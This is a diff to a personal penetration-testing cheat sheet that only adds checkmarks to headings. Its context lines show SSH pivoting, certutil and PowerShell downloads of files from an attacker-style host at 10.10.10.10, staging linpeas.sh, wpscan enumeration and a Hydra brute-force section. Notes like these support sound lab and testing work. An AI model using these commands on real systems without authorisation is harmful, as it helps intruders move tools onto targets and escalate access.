@@ -29,12 +29,12 @@ ssh -tt -L8080:localhost:8157 solcoteh@10.10.10.10 ssh -t -D 8157 solcoteh@10.10
 -oHostKeyAlgorithms=+ssh-rsa
 ```
 # File_Transfer ✅
-## linux
+## linux ✅
 ```bash
 python3 -m http.server 8000
 wget http://0.0.0.0:8000/linpeas.sh
 ```
-## windows 
+## windows ✅
 ```bash
 certutil -urlcache -split -f http://10.10.10.10:8000/namefile.txt C:\Users\Public\namefile.txt
 powershell -c wget "http://10.10.10.10:8000/namefile.txt" -OutFile "C:\Windows\Temp\namefile.txt"
@@ -90,7 +90,6 @@ wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2
 wpscan --url http://<adress>/ -e u (enum user)
 wpscan --url http://<adress>/ -e ap (plugin)
 ```
-
 # Brute Force Attack ✅📚
 ## Hydra Attack Type Cheat Sheet ✅
 ```bash
@@ -305,13 +304,13 @@ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/gam
 
 cat /etc/shells (show available shells)
 ```
-### Tools_Useful
+### Tools_Useful ✅
 [pspy](https://github.com/DominicBreuker/pspy)
 [chisel](https://github.com/jpillora/chisel)
 [nyancat](https://github.com/klange/nyancat)
 [linpeas.sh](https://github.com/peass-ng/PEASS-ng)
 [LinEnum.sh](https://github.com/rebootuser/LinEnum)
-### disable_rootkit
+### disable_rootkit ✅
 ```bash
 echo 1 > /proc/sys/kernel/modules_disabled
 sudo sysctl -w kernel.modules_disabled=1
